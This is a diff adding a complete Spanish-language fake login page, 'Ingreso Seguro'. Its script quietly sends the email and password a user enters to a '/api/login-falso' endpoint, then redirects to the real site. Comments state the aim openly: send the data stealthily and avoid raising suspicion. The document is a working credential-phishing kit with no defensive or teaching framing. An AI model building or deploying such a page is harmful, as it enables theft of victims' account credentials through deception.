@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso al Sistema</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
+        .login-container h2 { color: #1a73e8; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #1557b0; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Ingreso Seguro</h2>
+        <input type="email" id="email" placeholder="Correo electrónico" required>
+        <input type="password" id="password" placeholder="Contraseña" required>
+        <button onclick="enviarDatos()">Iniciar Sesión</button>
+    </div>
+
+    <script>
+        async function enviarDatos() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Por favor, completa los campos.");
+                return;
+            }
+
+            try {
+                // Enviar los datos sigilosamente a nuestro backend
+                const respuesta = await fetch('/api/login-falso', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const resultado = await respuesta.json();
+
+                // Ejecutar la redirección al sitio real para no levantar sospechas
+                if (resultado.redirectUrl) {
+                    window.location.href = resultado.redirectUrl;
+                }
+            } catch (error) {
+                console.error("Error de conexión:", error);
+            }
+        }
+    </script>
+</body>
+</html>
